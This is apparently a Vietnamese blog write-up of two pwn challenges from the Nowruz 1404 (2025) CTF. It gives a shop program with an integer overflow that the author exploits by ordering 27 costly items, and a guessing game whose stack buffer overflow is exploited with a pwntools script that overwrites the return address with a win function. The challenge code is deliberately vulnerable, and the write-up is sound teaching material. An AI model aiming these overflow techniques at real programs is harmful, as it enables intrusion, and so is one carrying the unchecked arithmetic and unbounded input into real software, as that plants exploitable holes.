---
title: '[Writeup] - Nowruz 1404 (2025) - PWN'
tag: ['PWN', 'Writeup']
---

# [Writeup] - Nowruz 1404 (2025) - PWN

## Pwn/Seen Shop

### Challenge Description

![image](/img/2025/Nowruz1404CTF/image-1.png)

### Source code

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define NUM_SEENS 7

typedef struct {
    char name[20];
    int price;
} Seen;
int credit;

void displayMenu(Seen seens[]);
void addToBasket(Seen seens[], int quantities[]);
void checkout(Seen seens[], int quantities[]);

Seen seens[NUM_SEENS] = {
    {"Sabzeh", 30000},
    {"Senjed", 20000},
    {"Seer", 20000},
    {"Seeb", 10000},
    {"Samanu", 35000},
    {"Serkeh", 40000},
    {"Sekkeh", 80000000}
};

void topup(){
    puts("na bassete");
}

int main() {
    int quantities[NUM_SEENS] = {0};
    int choice;

    credit = 1000000;
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    do {
        puts("Shop Menu:");
        puts("1. Add to Basket");
        puts("2. Checkout");
        puts("3. Top up");
        puts("4. Exit");
        printf("Enter your choice: ");
        scanf("%d", &choice);
        
        switch (choice) {
            case 1:
                addToBasket(seens, quantities);
                break;
            case 2:
                checkout(seens, quantities);
                break;
            case 3:
                topup();
            case 4:
                return 0;
            default:
                puts("Invalid choice. Try again.");
        }
    } while (choice != 3);
    
    return 0;
}

void displayMenu(Seen seens[]) {
    puts("Available 7 Seens:");
    for (int i = 0; i < NUM_SEENS; i++) {
        printf("%d. %s - %d Toman\n", i + 1, seens[i].name, seens[i].price);
    }
}

void addToBasket(Seen seens[], int quantities[]) {
    int item, qty;
    displayMenu(seens);
    printf("Enter item number to add (1-7): ");
    scanf("%d", &item);
    if (item < 1 || item > NUM_SEENS) {
        puts("Invalid item.");
        return;
    }
    printf("Enter quantity: ");
    scanf("%d", &qty);
    if (qty < 1) {
        puts("Invalid quantity.");
        return;
    }
    quantities[item - 1] += qty;
    printf("Added %d %s(s) to your basket.\n", qty, seens[item - 1].name);
}

void checkout(Seen seens[], int quantities[]) {
    int total = 0;
    puts("Your Basket:");
    for (int i = 0; i < NUM_SEENS; i++) {
        if (quantities[i] > 0) {
            printf("%s - %d item = %d Toman\n", seens[i].name, quantities[i], seens[i].price * quantities[i]);
            total += seens[i].price * quantities[i];
        }
    }

    printf("Total: %d\n",total);
    if(total > credit){
        puts("Not enough credit.");
        exit(0);
    }

    if(quantities[6] > 10){
        puts("oh... pole ke mirize...");
        system("cat /flag");
    }
    puts("Thank you ~~ Have a nice Nowruz!");
    exit(0);
}
```

Sau khi review qua source code thì tóm lại chương trình sẽ mô phỏng lại một cửa hàng buôn bán online với các tính năng: `(1) Thêm vào giỏ hàng; (2) Thanh toán; (3) Gọi đến một hàm in ra một chuỗi "na bassete"; (4) Thoát chương trình.`

Để lấy được flag thì khi checkout số tiền thanh toán phải lớn hơn tổng số tiền hàng mà mình đã đặt mua, còn nếu không thì chương trình sẽ thoát.
Đồng thời, số lượng của sản phẩm **Sekkeh** phải > 10 thì mới lấy được flag.

=> Ở đây, chương trình mắc phải lỗi Integer Overflow ở logic xử lý tỉnh tổng số tiền cần thanh toán: `total += seens[i].price * quantities[i];`

Chỉ cần truyền số lượng sản phẩm cần mua đủ lớn để khiến cho **total** bị âm hoặc nhỏ đi => nhỏ hơn **credit** => Get the flag

### Exploit

Do server đã đóng nên mình sẽ build lại và mô phỏng lại quá trình khai thác

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Shop]
└─$ gcc seen-shop.c -o seen-shop

┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Shop]
└─$ ./seen-shop
Shop Menu:
1. Add to Basket
2. Checkout
3. Top up
4. Exit
Enter your choice: 1
Available 7 Seens:
1. Sabzeh - 30000 Toman
2. Senjed - 20000 Toman
3. Seer - 20000 Toman
4. Seeb - 10000 Toman
5. Samanu - 35000 Toman
6. Serkeh - 40000 Toman
7. Sekkeh - 80000000 Toman
Enter item number to add (1-7): 7
Enter quantity: 27
Added 27 Sekkeh(s) to your basket.
Shop Menu:
1. Add to Basket
2. Checkout
3. Top up
4. Exit
Enter your choice: 2
Your Basket:
Sekkeh - 27 item = -2134967296 Toman
Total: -2134967296
oh... pole ke mirize...

VSL{fake}
Thank you ~~ Have a nice Nowruz!

┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Shop]
└─$
```

## Pwn/Seen Guessing

### Challenge Description

![img](/img/2025/Nowruz1404CTF/image.png)

### Source code

Dùng IDA để phân tích

**Main** function

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char input[24]; // [rsp+0h] [rbp-20h] BYREF
  int i; // [rsp+18h] [rbp-8h]
  int found; // [rsp+1Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("Let's play a game!");
  puts("Guess all 7 Seens and you'll win.");
  while ( correct_guesses <= 6 )
  {
    printf("Enter a Seen: ");
    __isoc99_scanf("%100s", input);
    found = 0;
    for ( i = 0; i <= 6; ++i )
    {
      if ( !strcasecmp(input, seens[i]) && !guessed_flags[i] )
      {
        guessed_flags[i] = 1;
        strcpy(&guessed[20 * correct_guesses], input);
        ++correct_guesses;
        found = 1;
        printf("Correct! %d/%d guessed.\n", correct_guesses, 7);
        break;
      }
    }
    if ( !found )
      puts("Incorrect or already guessed. Try again.");
  }
  puts("You guessed all 7 Seens! Nice job... but this is all you get.");
  return 0;
}
```

**Win** function

```c
void __cdecl win()
{
  char buf[268]; // [rsp+0h] [rbp-110h] BYREF
  int fd; // [rsp+10Ch] [rbp-4h]

  fd = open("/flag", 0);
  buf[(int)read(fd, buf, 0x100uLL)] = 0;
  puts(buf);
}
```

### Exploit

Kiểm tra các cơ chế của chương trình

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Guessing]
└─$ checksec chall
[*] '/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Guessing/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

Qua đây và kết hợp với phân tích source code, mình nhận thấy chương trình có hàm **win** + **PIE tắt** + **Canary tắt** + Người dùng có thể nhập tới 100 bytes cho biến **input[24]**

=> Overwrite Return Address to Win function => Get flag

Lúc này, chỉ cần ghi đè địa chỉ ret 1 lần sau đó đoán đúng hết tất cả các câu đố để chương trình thoát ra khỏi vòng **while** để ret => Trở về địa chỉ hàm **Win** => PWN

**Code exploit**

```python
from pwn import *

# p = process("./chall")
p = remote("164.92.176.247", 5002)
elf = ELF("./chall", checksec=False)
padding = 40

ans = ['Sonbol', 'Sabzeh', 'Seer', 'Seeb', 'Senjed', 'Samanu', 'Serkeh']

payload = b"A" * padding + p64(elf.sym.win)

p.sendlineafter(b"Seen: ", payload)
for i in ans:
    p.sendlineafter(b"Seen: ", i.encode())
    
p.interactive()
```

### Get flag

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/Nowruz 1404/pwn/Seen Guessing]
└─$ python3 sol.py 
[+] Starting local process './chall': pid 70
[*] Switching to interactive mode
Correct! 7/7 guessed.
You guessed all 7 Seens! Nice job... but this is all you get.

VSL{fake}

[*] Got EOF while reading in interactive
$  
```

## 